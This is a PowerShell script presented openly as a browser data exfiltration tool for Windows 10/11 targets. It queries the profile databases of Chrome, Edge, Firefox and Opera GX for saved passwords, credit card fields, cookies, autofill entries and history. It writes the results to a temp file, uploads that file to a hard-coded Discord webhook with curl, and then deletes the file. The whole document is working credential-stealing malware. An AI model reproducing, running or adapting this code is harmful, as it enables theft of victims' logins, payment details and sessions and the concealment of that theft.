# Title: Browser Data Exfiltration with Remote Script Execution (2024 Professional Update)
# Author: Jakoby
# Description: This script extracts saved usernames/passwords, credit card information, cookies, autofill data, and browsing history from Chrome, Edge, Firefox, and Opera GX on Windows 10/11 targets.

# Target OS: Windows 10, 11

function Get-BrowserData {
    [CmdletBinding()]
    param (
        [Parameter(Position = 1, Mandatory = $True)]
        [string]$Browser,
        [Parameter(Position = 2, Mandatory = $True)]
        [string]$DataType
    )

    $Path = switch ($Browser) {
        'chrome'  { 
            if ($DataType -eq 'passwords') { "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data" }
            elseif ($DataType -eq 'creditcards') { "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Web Data" }
            elseif ($DataType -eq 'cookies') { "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Cookies" }
            elseif ($DataType -eq 'autofill') { "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Web Data" }
            elseif ($DataType -eq 'history') { "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History" }
        }
        'edge'    {
            if ($DataType -eq 'passwords') { "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Login Data" }
            elseif ($DataType -eq 'creditcards') { "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Web Data" }
            elseif ($DataType -eq 'cookies') { "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Cookies" }
            elseif ($DataType -eq 'autofill') { "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Web Data" }
            elseif ($DataType -eq 'history') { "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History" }
        }
        'firefox' {
            if ($DataType -eq 'passwords') { "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\logins.json" }
            elseif ($DataType -eq 'cookies') { "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite" }
            elseif ($DataType -eq 'history') { "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite" }
        }
        'opera'   {
            if ($DataType -eq 'passwords') { "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Login Data" }
            elseif ($DataType -eq 'creditcards') { "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Web Data" }
            elseif ($DataType -eq 'cookies') { "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Cookies" }
            elseif ($DataType -eq 'autofill') { "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Web Data" }
            elseif ($DataType -eq 'history') { "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History" }
        }
        default { Write-Error "Unsupported browser or data type specified."; return }
    }

    if (-not (Test-Path $Path)) {
        Write-Warning "The path for $Browser $DataType could not be found."
        return
    }

    try {
        $sqliteCommand = "sqlite3.exe"
        if ($DataType -eq 'passwords' -and ($Browser -eq 'chrome' -or $Browser -eq 'edge' -or $Browser -eq 'opera')) {
            $query = "SELECT origin_url, username_value, password_value FROM logins"
            if (Test-Path $sqliteCommand) {
                $passwordData = & $sqliteCommand $Path $query
                Write-Output "[$Browser Passwords]: $passwordData"
            } else {
                Write-Warning 'sqlite3.exe not found. Unable to extract passwords.'
            }
        } elseif ($DataType -eq 'passwords' -and $Browser -eq 'firefox') {
            $firefoxData = Get-Content -Path $Path | ConvertFrom-Json
            Write-Output "[Firefox Passwords]: $($firefoxData.logins)"
        } elseif ($DataType -eq 'creditcards' -and ($Browser -eq 'chrome' -or $Browser -eq 'edge' -or $Browser -eq 'opera')) {
            $query = "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards"
            if (Test-Path $sqliteCommand) {
                $creditCardData = & $sqliteCommand $Path $query
                Write-Output "[$Browser Credit Cards]: $creditCardData"
            } else {
                Write-Warning 'sqlite3.exe not found. Unable to extract credit card information.'
            }
        } elseif ($DataType -eq 'cookies' -or $DataType -eq 'autofill' -or $DataType -eq 'history') {
            $query = switch ($DataType) {
                'cookies' { "SELECT host_key, name, encrypted_value FROM cookies" }
                'autofill' { "SELECT name, value FROM autofill" }
                'history' { "SELECT url, title, visit_count FROM urls" }
            }
            if (Test-Path $sqliteCommand) {
                $data = & $sqliteCommand $Path $query
                Write-Output "[$Browser $DataType]: $data"
            } else {
                Write-Warning 'sqlite3.exe not found. Unable to extract data.'
            }
        } else {
            Write-Warning "Unsupported data type for $Browser."
        }
    } catch {
        Write-Error "Failed to extract $DataType from $Browser: $_"
    }
}

# Define exfiltration method (Discord webhook)
$dc = 'https://discord.com/api/webhooks/1225028544258641981/kmftS6B2qpwjcNBn3ovPTEoI8MVsRDikLkYZr1tUTuHNohr-A6ljyvd3MRRGwmI8ehOo'

# Check if Discord webhook is set
if ([string]::IsNullOrEmpty($dc)) {
    Write-Error 'No exfiltration method set. Exiting.'
    exit
}

# Collect browser data in parallel
$outputFile = "$env:TMP\BrowserData.txt"
try {
    $browsers = @("edge", "chrome", "firefox", "opera")
    $dataTypes = @("passwords", "creditcards", "cookies", "autofill", "history")

    $jobs = @()
    foreach ($browser in $browsers) {
        foreach ($dataType in $dataTypes) {
            $jobs += Start-Job -ScriptBlock {
                param ($browser, $dataType, $outputFile)
                $data = Get-BrowserData -Browser $browser -DataType $dataType
                if ($data) {
                    Add-Content -Path $outputFile -Value $data
                }
            } -ArgumentList $browser, $dataType, $outputFile
        }
    }

    # Wait for all jobs to complete
    $jobs | ForEach-Object { $_ | Wait-Job; Remove-Job $_ }
} catch {
    Write-Error "Failed to collect browser data: $_"
}

# Ensure output file is not empty
if (-not (Test-Path $outputFile) -or (Get-Item $outputFile).Length -eq 0) {
    Write-Error "No data collected. Exiting."
    exit
}

# Send completion notification to Discord
try {
    $body = @{ "content" = 'Browser data exfiltration script executed successfully, including browser data.' } | ConvertTo-Json
    Invoke-RestMethod -Uri $dc -Method Post -Body $body -ContentType 'application/json' -UseBasicParsing
    curl.exe -F "file1=@$outputFile" $dc
} catch {
    Write-Error "Failed to send notification to Discord webhook: $_"
}

# Clean up
try {
    Remove-Item -Path $outputFile -Force -ErrorAction SilentlyContinue
} catch {
    Write-Warning "Failed to clean up the output file: $_"
}
